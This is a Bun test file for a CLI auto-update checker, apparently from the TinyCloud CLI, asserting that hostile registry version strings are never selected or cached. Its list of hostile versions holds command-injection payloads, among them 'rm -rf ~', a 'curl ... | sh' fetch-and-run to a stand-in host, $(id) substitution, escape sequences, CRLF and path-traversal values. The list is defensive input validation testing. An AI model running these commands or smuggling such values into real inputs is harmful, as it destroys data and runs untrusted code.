import { expect, test } from "bun:test";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { checkForUpdate, selectUpdateVersion, updateNotice } from "./auto-update.js";

const HOSTILE_VERSIONS = [
  "1.8.0-beta.9\u001b[2J\u001b]0;pwned\u0007",
  "1.8.0-beta.9; rm -rf ~",
  "1.8.0-beta.9 && curl https://example.invalid | sh",
  "1.8.0-beta.9$(id)",
  "1.8.0-beta.9`id`",
  "1.8.0-beta.9|id",
  "1.8.0-beta.9\n",
  "1.8.0-beta.9\r\nX-Injected: 1",
  "1.8.0-beta.9'",
  "1.8.0-beta.9\"",
  "../../1.8.0-beta.9",
  "1.8.0-beta.9 --registry=https://example.invalid",
];

async function withDirectory(run: (cachePath: string) => Promise<void>): Promise<void> {
  const directory = await mkdtemp(join(tmpdir(), "tc-auto-update-untrusted-"));
  try {
    await run(join(directory, "update-check.json"));
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
}

test("a hostile registry version string is never selected", () => {
  for (const hostile of HOSTILE_VERSIONS) {
    expect(selectUpdateVersion("1.8.0-beta.8", { beta: hostile })).toBeNull();
    expect(selectUpdateVersion("1.7.0", { latest: hostile.replace("-beta.9", "") })).toBeNull();
  }
});

test("a hostile registry response yields no update and caches no version", async () => {
  for (const hostile of HOSTILE_VERSIONS) {
    await withDirectory(async (cachePath) => {
      const result = await checkForUpdate({
        currentVersion: "1.8.0-beta.8",
        cachePath,
        fetchFn: async () => Response.json({ version: hostile }),
      });
      expect(result).toBeNull();
      const cached = JSON.parse(await readFile(`${cachePath}.beta`, "utf8")) as { version: unknown };
      expect(cached.version).toBeNull();
    });
  }
});

test("a hostile version already in the cache yields no update and no registry request", async () => {
  for (const hostile of HOSTILE_VERSIONS) {
    await withDirectory(async (cachePath) => {
      await writeFile(`${cachePath}.beta`, JSON.stringify({ checkedAt: Date.now(), version: hostile }), { mode: 0o600 });
      let requests = 0;
      const result = await checkForUpdate({
        currentVersion: "1.8.0-beta.8",
        cachePath,
        fetchFn: async () => { requests += 1; return Response.json({ version: hostile }); },
      });
      expect(result).toBeNull();
      expect(requests).toBe(0);
    });
  }
});

test("the registry request uses the encoded scope form and a valid response is returned as fetched", async () => {
  await withDirectory(async (cachePath) => {
    const urls: string[] = [];
    const result = await checkForUpdate({
      currentVersion: "1.8.0-beta.8",
      cachePath,
      fetchFn: async (input) => { urls.push(String(input)); return Response.json({ version: "1.8.0-beta.9" }); },
    });
    expect(urls).toEqual(["https://registry.npmjs.org/@tinycloud%2fcli/beta"]);
    expect(result).toBe("1.8.0-beta.9");
    expect(updateNotice("npm-global", "1.8.0-beta.8", result!)).toBe("TinyCloud CLI 1.8.0-beta.9 is available. This is 1.8.0-beta.8, installed with npm.");
  });
});
